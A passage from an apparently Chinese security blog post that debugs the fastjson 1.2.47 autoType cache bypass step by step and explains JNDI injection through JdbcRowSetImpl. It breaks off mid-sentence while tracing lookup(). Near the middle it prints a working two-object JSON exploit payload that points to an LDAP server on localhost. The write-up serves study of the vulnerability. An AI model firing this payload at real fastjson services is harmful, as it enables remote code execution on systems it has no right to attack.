class="hljs-type">DefaultJSONParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultJSONParser</span>(text, config, features);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> parser.parse();    <span class="hljs-comment">//步入该句parse</span><br>        parser.handleResovleTask(value);<br>        parser.close();<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实例化 <code>DefaultJSONParser</code> 对象后继续步入 <code>parse()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.parse((Object)<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续步入</p><p><img src="/img/fastjsonAndJNDI/PYPQbdNuCoA8M8xrc12csAtbnlC.png"></p><p>继续步入</p><p><img src="/img/fastjsonAndJNDI/QkLobDJaioKbBvxIAgEc6ZYNn8R.png"></p><p>继续步入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.parse((Object)<span class="hljs-literal">null</span>);    <span class="hljs-comment">//步入该句parse</span><br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><p>总之盯准 parse 一层层进入即可看到 fastjson 反序列化的大致流程，随后就可以发现对 <code>@type</code> 的检测处理，使用 <code>checkAutoType()</code> 对 <code>@type</code> 后面的用户指定类检查过滤，加载返回一个该类的对象</p><p><img src="/img/fastjsonAndJNDI/LoDZblh8HoZ6I9xWOgycFOGlnzf.png"></p><p>步入观察源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="hljs-type">int</span> features) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;    <span class="hljs-comment">//判断类名非空</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &lt; <span class="hljs-number">128</span> &amp;&amp; typeName.length() &gt;= <span class="hljs-number">3</span>) &#123;  <span class="hljs-comment">//判断类名长度，否则抛出异常</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//该部分使用了hash算法初步处理，为了后续跟hash处理过的黑白名单匹配</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span>;<br>        <span class="hljs-keyword">if</span> (h1 == -<span class="hljs-number">5808493101479473382L</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName); <span class="hljs-comment">//类名以 [ 开头抛出异常</span><br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((h1 ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName); <span class="hljs-comment">//类名以 L 开头 ; 结尾抛出异常</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">2</span>)) * <span class="hljs-number">1099511628211L</span>;<br>            <span class="hljs-type">long</span> hash;<br>            <span class="hljs-type">int</span> i;<br>            <span class="hljs-comment">//当autoTypeSupport开启或期望的类不为空时（上一步的图片中调用checkAutoType时可以看到传入的expectClass为null）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>                hash = h3;<br><br>                <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>                    hash ^= (<span class="hljs-type">long</span>)className.charAt(i);<br>                    hash *= <span class="hljs-number">1099511628211L</span>;<br>                    <span class="hljs-comment">//先检查hash值是否在白名单中存在，存在则_loadClass_加载类并返回对象</span><br>                    <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                        clazz = TypeUtils._loadClass_(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">false</span>);<br>                        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-comment">//后检查hash值是否在黑名单中存在，存在则直接抛出异常</span><br>                    <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span> &amp;&amp; TypeUtils._getClassFromMapping_(typeName) == <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">//如果经过上面黑白名单检查后或autoTypeSupport未开启等原因导致未检查后clazz仍为null</span><br>            <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                clazz = TypeUtils._getClassFromMapping_(typeName);<span class="hljs-comment">//那么在TypeUtils.mappings中缓存的类寻找目标</span><br>            &#125;<br><br>            <span class="hljs-comment">//如果上述黑白名单检查后及TypeUtils.mappings缓存类查找后仍未找到该类（clazz为null）</span><br>            <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<span class="hljs-comment">//则在deserializers中继续寻找</span><br>            &#125;<br><br>            <span class="hljs-comment">//如果上述三个途径有任意一个找到了，clazz不为null</span><br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> clazz;<span class="hljs-comment">//那么直接返回对象</span><br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//上述三个途径仍未找到</span><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<span class="hljs-comment">//且autoTypeSupport关闭</span><br>                    hash = h3;<br><br>                    <span class="hljs-comment">//跟前面差不多的黑白名单检查，但先黑后白</span><br>                    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &lt; className.length(); ++i) &#123;<br>                        <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> className.charAt(i);<br>                        hash ^= (<span class="hljs-type">long</span>)c;<br>                        hash *= <span class="hljs-number">1099511628211L</span>;<br>                        <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.denyHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (Arrays._binarySearch_(<span class="hljs-built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                                clazz = TypeUtils._loadClass_(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">false</span>);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                            &#125;<br><br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//不论autoTypeSupport是否开启均黑白名单检查过后，且TypeUtils.mappings、deserializers寻找后均未找到</span><br>                    clazz = TypeUtils._loadClass_(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader, <span class="hljs-literal">false</span>);<span class="hljs-comment">//则使用TypeUtils.loadClass尝试加载这个类</span><br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//上面TypeUtils._loadClass成功加载了该类则再做一些安全处理_</span><br>                    <span class="hljs-keyword">if</span> (TypeUtils._getAnnotation_(clazz, JSONType.class) != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br><br>                    <span class="hljs-comment">//禁止反序列化ClassLoader和DataSource，做一些安全措施</span><br>                    <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;<br>                            <span class="hljs-keyword">return</span> clazz;<br>                        &#125;<br><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125;<br><br>                    <span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo._build_(clazz, clazz, <span class="hljs-built_in">this</span>.propertyNamingStrategy);<br>                    <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.autoTypeSupport) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-type">int</span> <span class="hljs-variable">mask</span> <span class="hljs-operator">=</span> Feature._SupportAutoType_.mask;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">autoTypeSupport</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.autoTypeSupport || (features &amp; mask) != <span class="hljs-number">0</span> || (JSON._DEFAULT_PARSER_FEATURE _&amp; mask) != <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致分析一下主要逻辑：当 <code>autoTypeSupport</code> 关闭时，第一次针对 <code>autoTypeSupport</code> 开启时的黑白名单检查不会进行，如果在 <code>TypeUtils.mappings</code>、<code>deserializers</code> 中可以找到目标类，那么直接加载该类返回对象，如果找不到，那么进行第二次的针对 <code>autoTypeSupport</code> 关闭时的黑白名单检查，还找不到则尝试使用 <code>TypeUtils.loadClass</code> 加载这个类并做安全处理；当 <code>autoTypeSupport</code> 开启时，第一次的黑白名单检查无法绕过，必然会执行，后面再在 <code>TypeUtils.mappings</code>、<code>deserializers</code> 中查找，找不到则尝试使用 <code>TypeUtils.loadClass</code> 加载这个类并做安全处理。</p><p>通过以上对 <code>checkAutoType()</code> 分析，我们可以发现一个逻辑上的漏洞：当 <code>autoTypeSupport</code> 关闭时，只要可以让目标类在 <code>TypeUtils.mappings</code>、<code>deserializers</code> 中被找到，那么就可以绕过后面针对 <code>autoTypeSupport</code> 关闭时的黑白名单检测，调用恶意类实现攻击。</p><p>所以接下来需要找到可以控制 <code>TypeUtils.mappings</code>、<code>deserializers</code> 的方法。这里主要借鉴了<a href="https://su18.org/post/fastjson/#7-fastjson-1247">素十八这篇文章</a>，讲得十分详细，这里我暂时无法较为独立地去查看、分析各个方法，所以主要摘取<a href="https://su18.org/post/fastjson/#7-fastjson-1247">素十八这篇文章</a>（这里直接看原文得了，或者看最下面参考资料的<a href="https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.1387.homepage.video_card.click&vd_source=ae44e9df2e6bb265e83888153930e885">视频</a>里也有讲解）</p><p><img src="/img/fastjsonAndJNDI/ZBSTbwWhWo3QtlxwV5kcotiRnxf.png" alt="来自素十八"></p><p><img src="/img/fastjsonAndJNDI/RQd5bou7go3LwVxe8Y8cfiUNn6c.png" alt="来自素十八"></p><p><img src="/img/fastjsonAndJNDI/HW3pbvns9oc0W7xlOaccx2PHnrc.png" alt="来自素十八"></p><p><img src="/img/fastjsonAndJNDI/EzBibGpPioWr7Px5zqscYkacnce.png" alt="来自素十八"></p><p>总结一下：<code>deserializers</code> 没有可控地写入目标类的方法，<code>TypeUtils.mappings</code> 则可以使用 <code>loadClass</code> 方法将目标类加载入 <code>mappings</code> 缓存，而 <code>loadClass</code> 方法一共有三个重载方法，其中 <code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code> 方法会在 <code>fastjson</code> 包中的 <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> 方法中被调用（<code>MiscCodec</code> 就是 fastjson 的一个反序列化器，用来处理各种反序列化类），筛选使用 <code>MiscCodec</code> 处理的类，发现其中包含 <code>Class.class</code>，同时刚好 <code>Class.class</code> 会在 <code>deserializers</code> 初始化时加载。</p><p>也就是说如果反序列化目标 class 是 <code>Class.class</code> 时，<code>deserializers</code> 中可以找到该类直接加载返回，然后反序列化会调用 <code>MiscCodec</code> 的 <code>loadClass</code> 方法，将其中的参数 strVal 进行类加载并缓存，那么我们先将 <code>Class.class</code> 作为反序列化目标类把恶意利用类名放在 strVal 中，从而在处理 <code>Class.class</code> 反序列化时将恶意利用类加载入 <code>TypeUtils.mappings</code> 缓存，最终反序列化恶意利用类时绕过 <code>checkAutoType()</code> 的黑白名单检测。</p><h2 id="JNDI-简要分析"><a href="#JNDI-简要分析" class="headerlink" title="JNDI 简要分析"></a>JNDI 简要分析</h2><p>在 fastjson 反序列化可以实现后，有各种适用不同情况的利用链可以选择，这里先简单研究一下比较常见的通过 <code>com.sun.rowset.JdbcRowSetImpl</code> 实现 JNDI 注入。</p><p>JNDI（Java Naming and Directory Interface），即 Java 命名和目录接口，它用于给 Java 应用程序提供命名和目录访问服务。类似开发时经常使用到的 jdbc，都是构建在抽象层上，jdbc 相当于实现 java 与一个数据库之间的联系交互，而 JNDI 则可以实现与目录列表中多个数据库动态访问，将对象和名称联系在一起，并通过指定的名称找到相应的对象。</p><p>JNDI 可访问的目录及服务有：DNS、XNam、Novell 目录服务、LDAP(Lightweight Directory Access  Protocol 轻型目录访问协议)、CORBA 对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x 的注册表、RMI（Remote Method Invocation 远程方法调用）、DSML v1&amp;v2、NIS 等。其中相对常用的即 RMI、LDAP、DNS、CORBA。JNDI 就可以当作在这些服务的基础上一个方便使用的统一的接口，通过这个接口去定位、调用资源。</p><p>JNDI 注入实现的核心是 <code>javax.naming.InitialContext#lookup()</code> 参数可控，<code>lookup()</code> 函数用于查找传入的对象名称参数对应的对象，可以指定 url 来绑定远程对象加载，之后执行该类的静态代码块、代码块、无参构造函数和 <code>getObjectInstance</code> 方法。显而易见的是，控制了 <code>lookup()</code> 参数就可能实现远程向目标服务器加载恶意代码。具体原理可以参照 <a href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">myzxcg 的基础概念</a>、<a href="https://www.cnblogs.com/nice0e3/p/13958047.html#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">nice_0e3</a><a href="https://www.cnblogs.com/nice0e3/p/13958047.html#0x02-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">的前置知识</a>。</p><p>JNDI 注入常用的协议为 rmi 和 ldap，各自都有一些使用限制如下</p><p><img src="/img/fastjsonAndJNDI/OVLVbHvzwoMxdjx3hKsc05BUnyh.png" alt="来自myzxcg"></p><h1 id="攻击实现流程分析"><a href="#攻击实现流程分析" class="headerlink" title="攻击实现流程分析"></a>攻击实现流程分析</h1><p>idea 中连按两下 shift 搜索 <code>checkAutoType()</code> 打个断点（<code>autoTypeSupport</code> 是默认关闭的状态）</p><p>向本地服务发包 json 参数让目标反序列化处理，使用的 payload 由上面的分析中得来：先将 <code>Class.class</code> 反序列化（本身会 <code>deserializers</code> 初始化时加载，<code>deserializers</code> 中可以找到该类，从而不受黑白名单限制），加载的过程中将 <code>&quot;val&quot;</code> 中的 <code>JdbcRowSetImpl</code> 加载入 <code>TypeUtils.mappings</code> 缓存；然后再反序列化 <code>JdbcRowSetImpl</code> 类，由于可以在 <code>mappings</code> 缓存中找到 <code>JdbcRowSetImpl</code> 类，所以直接加载对象并返回，绕过黑白名单检查；加载对象后连接 <code>&quot;dataSourceName&quot;</code> 的远程 ldap 服务并执行远程对象恶意代码实现 JNDI 注入。</p><p>第一个对象将指定类存入缓存绕过 fastjson 检测，第二个对象用来触发 JNDI 注入。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:8085/PrIXqXOz&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="fastjson-部分"><a href="#fastjson-部分" class="headerlink" title="fastjson 部分"></a>fastjson 部分</h2><p>第一轮调用 <code>checkAutoType()</code>，处理 <code>java.lang.Class</code></p><p><img src="/img/fastjsonAndJNDI/EGAIbA47XonaJPxVLD0cZoxEnkg.png"></p><p>初步 hash 处理后 <code>autoTypeSupport</code> 默认关闭，传入参数 <code>expectClass</code> 为 null，所以第一个黑白名单不检查</p><p><img src="/img/fastjsonAndJNDI/FMzvbE2ZUoxTGdxQgrScq23Gn5b.png"></p><p><code>deserializers</code> 中找到该类，加载并返回</p><p><img src="/img/fastjsonAndJNDI/Xt7gb0myXo5rD3xo50vcao6Pn7b.png"></p><p>第一轮 <code>checkAutoType()</code> 结束，回到 DefaultJSONParser</p><p><img src="/img/fastjsonAndJNDI/PXXrbSExmoY4VPxz0aBcFYy4nae.png"></p><p>向后步过可以看到反序列化处理 <code>obj = deserializer.deserialze(this, clazz, fieldName);</code>，使用的反序列化器即前面提到的 <code>MiscCodec</code>，我们在这句步入观察反序列化处理过程</p><p><img src="/img/fastjsonAndJNDI/NKYebUFU9oGVaWx6XTUcr7Ahnje.png"></p><p>向后步过，开始处理参数 <code>&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</code></p><p><img src="/img/fastjsonAndJNDI/EKhpbHYIqoIIBuxGswicLz3DnWe.png"></p><p>随后 <code>objVal</code> 就将参数中的类名字符串赋值给前面提到的 <code>strVal</code>，当 <code>strVal</code> 非空就逐个匹配当前反序列化的类</p><p><img src="/img/fastjsonAndJNDI/Gt3Vb2X2MotFaLxu6eXcTkZ2nxf.png"></p><p>匹配到 <code>Class.class</code>，于是加载 <code>strVal</code> 类并返回，这里选中 <code>loadClass</code> 步入观察 <code>JdbcRowSetImpl</code> 加载过程</p><p><img src="/img/fastjsonAndJNDI/Ub0Fb9ZIpoTf1bx1ktxc2IEknxd.png"></p><p>继续步入 <code>loadClass</code>，注意当前版本 cache 默认为 true，这也是这个版本缓存绕过方法可行的原因之一</p><p><img src="/img/fastjsonAndJNDI/GcsibIxfcoBQ6jx7rFLcl22qnHf.png"></p><p>检测类名 <code>className</code> 非空</p><p><img src="/img/fastjsonAndJNDI/N8eVb77ogo9BnAxYp0kcCVUgnkd.png"></p><p>尝试从 <code>mappings</code> 缓存中获取类名为 <code>com.sun.rowset.JdbcRowSetImpl</code> 的对象</p><p><img src="/img/fastjsonAndJNDI/HCwlbegP0o8PkhxGeKqcZpRpnjh.png"></p><p>正常情况下缓存中没有 <code>com.sun.rowset.JdbcRowSetImpl</code>，返回 clazz 为 null，无法直接返回 clazz。（第一次运行时是这样，成功一次后 <code>mappings</code> 中就有了，不会出现这张图）</p><p><img src="/img/fastjsonAndJNDI/MXcMbxwmXo1iVTxlvZDcmtCVnvd.png"></p><p>当缓存中已有 <code>com.sun.rowset.JdbcRowSetImpl</code> 时如下图，它就不会继续加载，直接返回。（想看上图则重启项目再调试一遍）</p><p><img src="/img/fastjsonAndJNDI/SgSTbiT4xotwYExKUXocZ0pwn3G.png"></p><p>判断是否 <code>[</code> 开头或 <code>L</code> 开头 <code>;</code> 结尾</p><p><img src="/img/fastjsonAndJNDI/F2g3bxZYvobplrxjtZCcVVWpnnh.png"></p><p>继续向后步过，因为前面传入的参数为 <code>getDefaultClassLoader()</code>，而 <code>com.sun.rowset.JdbcRowSetImpl</code> 类没有指定的默认 <code>classLoader</code>，所以为 null。此处用 <code>contextClassLoader.loadClass(className)</code> 加载类，并 cache 为 true 的情况下将其放入 <code>mappings</code> 缓存，最后 return 返回</p><p><img src="/img/fastjsonAndJNDI/BKvpbsiz3oMzLJxt73mcCrylndc.png"></p><p>马上 <code>mappings</code> 里就找得到 <code>com.sun.rowset.JdbcRowSetImpl</code> 了</p><p><img src="/img/fastjsonAndJNDI/JqHMbkNLBoHTxZxvGZfcSso3n2g.png"></p><p>后续直接按一次恢复程序按钮到断点处，第二轮调用 <code>checkAutoType()</code>，处理 <code>com.sun.rowset.JdbcRowSetImpl</code>，第一个黑白名单同样不检查</p><p><img src="/img/fastjsonAndJNDI/OsshbUeaKoHMzPxY09Uc4SoZnae.png"></p><p>步过到 <code>TypeUtils.mappings</code>、<code>deserializers</code> 查找</p><p><img src="/img/fastjsonAndJNDI/SWSubfWXgopJDuxirm4cPFjsndc.png"></p><p>可以从 <code>TypeUtils.mappings</code> 找到 <code>JdbcRowSetImpl</code></p><p><img src="/img/fastjsonAndJNDI/RSKkbd2KlobPZKxUmCSccPiHnYe.png"></p><p>返回 clazz，至此第二轮 <code>checkAutoType()</code> 结束，成功利用缓存机制绕过了黑名单检测</p><p><img src="/img/fastjsonAndJNDI/HNRob7q2LovezHxnjUhcgmsVnXg.png"></p><p>回到 DefaultJSONParser</p><p><img src="/img/fastjsonAndJNDI/LFcSbw1edoX53jxpndDcAIUwnUe.png"></p><h2 id="JNDI-部分"><a href="#JNDI-部分" class="headerlink" title="JNDI 部分"></a>JNDI 部分</h2><p>同之前一样步入反序列化处理 <code>obj = deserializer.deserialze(this, clazz, fieldName);</code> 但此处 <code>fieldName</code> 不为 null</p><p><img src="/img/fastjsonAndJNDI/E68IbUqMmouMhux3e87cpx7Nnmc.png"></p><p>继续步入，<code>features</code> 默认为 0</p><p><img src="/img/fastjsonAndJNDI/UD6hbjy9Hohy8fxriDAcN615n4e.png"></p><p>这里不清楚什么原因没调进去，修改了一下 debug 的步入设置也不成，</p><p><img src="/img/fastjsonAndJNDI/Zys3bZWG1ovJpIxSAWhcLFRpnle.png"></p><p>所以直接在 <code>JdbcRowSetImpl</code> 文件里查找 <code>lookup()</code> 